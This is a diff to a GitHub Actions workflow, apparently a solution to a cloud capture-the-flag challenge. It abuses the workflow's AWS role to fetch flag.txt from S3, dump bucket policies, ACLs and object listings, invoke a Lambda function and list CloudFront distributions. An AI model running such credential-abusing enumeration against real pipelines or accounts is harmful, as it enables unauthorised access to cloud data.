@@ -10,7 +10,7 @@ permissions:
 
 jobs:
   dump:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v4
@@ -19,19 +19,34 @@ jobs:
           aws-region: us-east-1
           role-session-name: cloudescape-corgi
 
-      - name: Enumerate
+      - name: Get flag candidates
         run: |
-          set -e
-          aws sts get-caller-identity | tee /tmp/id.json
-          echo "=== S3 buckets ==="
-          aws s3api list-buckets --output json | tee /tmp/buckets.json || true
-          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
-            echo "==== BUCKET $b ===="
-            aws s3 ls "s3://$b" --recursive || true
+          set +e
+          echo "=== try get flag.txt from codec bucket ==="
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - ; echo EXIT:$?
+          aws s3api get-object --bucket codec4f26c862a321ef5 --key flag.txt /tmp/flag.txt ; echo EXIT:$?
+          if [ -f /tmp/flag.txt ]; then echo CONTENT; xxd /tmp/flag.txt; cat /tmp/flag.txt; fi
+
+          echo "=== bucket policies ==="
+          for b in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
+            echo "--- policy $b ---"
+            aws s3api get-bucket-policy --bucket "$b" --output text 2>&1
+            echo "--- status $b ---"
+            aws s3api get-bucket-policy-status --bucket "$b" 2>&1
+            echo "--- acl $b ---"
+            aws s3api get-bucket-acl --bucket "$b" 2>&1 | head -40
           done
-          echo "=== Lambda ==="
-          aws lambda list-functions --output json | tee /tmp/lambda.json || true
-          for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text 2>/dev/null); do
-            echo "==== FN $fn ===="
-            aws lambda get-function --function-name "$fn" || true
+
+          echo "=== list all keys detailed ==="
+          for b in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
+            echo "==== $b ===="
+            aws s3api list-objects-v2 --bucket "$b" --output json 2>&1
           done
+
+          echo "=== lambda policy / try invoke ==="
+          aws lambda get-policy --function-name nslookupv2 2>&1
+          aws lambda invoke --function-name nslookupv2 --payload '{"domain":"example.com"}' /tmp/out.json 2>&1
+          cat /tmp/out.json 2>/dev/null
+
+          echo "=== cloudfront ==="
+          aws cloudfront list-distributions --output json 2>&1 | head -c 50000
